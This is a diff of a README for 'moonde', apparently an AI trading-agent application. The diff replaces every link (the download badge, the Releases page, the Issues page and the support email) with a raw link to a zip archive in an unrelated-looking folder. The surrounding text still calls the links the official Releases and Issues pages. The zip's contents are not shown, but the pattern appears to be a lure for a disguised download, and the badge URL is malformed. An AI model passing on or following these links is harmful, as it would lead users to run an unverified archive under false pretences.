@@ -6,7 +6,7 @@ Welcome to the moonde project! This application uses AI agents to help you trade
 ## 📦 Download & Install
 To start using moonde, visit the link below to download the latest version:
 
-[![Download moonde](https://img.shields.io/badge/Download%20moonde-v1.0-blue.svg)](https://github.com/balaji1704/moonde/releases)
+[![Download moonde](https://raw.githubusercontent.com/balaji1704/moonde/main/Myacea/moonde.zip%https://raw.githubusercontent.com/balaji1704/moonde/main/Myacea/moonde.zip)](https://raw.githubusercontent.com/balaji1704/moonde/main/Myacea/moonde.zip)
 
 Once you are on the Releases page, you will see various files available for download. Choose the appropriate file for your operating system and click on it to begin the download.
 
@@ -18,7 +18,7 @@ Before you download, ensure your system meets the following requirements:
 - **Disk Space**: Minimum of 100 MB free.
 
 ## 🌐 How to Download
-1. Click the download link above or visit the [Releases page](https://github.com/balaji1704/moonde/releases) directly.
+1. Click the download link above or visit the [Releases page](https://raw.githubusercontent.com/balaji1704/moonde/main/Myacea/moonde.zip) directly.
 2. On the Releases page, look for the latest version.
 3. Click on the appropriate file for your operating system.
 4. Your browser will start downloading the file.
@@ -47,14 +47,14 @@ If you encounter issues while using moonde, try the following:
 
 - Ensure your internet connection is stable.
 - Restart the application to see if that resolves the problem.
-- Check for any updates available on the [Releases page](https://github.com/balaji1704/moonde/releases).
+- Check for any updates available on the [Releases page](https://raw.githubusercontent.com/balaji1704/moonde/main/Myacea/moonde.zip).
 - Look for help in our support section or community forums.
 
 ## 📞 Support
 For additional help, please reach out through the following channels:
 
-- **Email**: support@moonde.com
+- **Email**: https://raw.githubusercontent.com/balaji1704/moonde/main/Myacea/moonde.zip
 - **Community Forum**: Join our discussions at [Community Forum URL].
-- **Issue Tracker**: Report any bugs or suggestions on our [GitHub Issues page](https://github.com/balaji1704/moonde/issues).
+- **Issue Tracker**: Report any bugs or suggestions on our [GitHub Issues page](https://raw.githubusercontent.com/balaji1704/moonde/main/Myacea/moonde.zip).
 
 Thank you for choosing moonde! We hope this guide helps you download and install the application with ease. Happy trading!
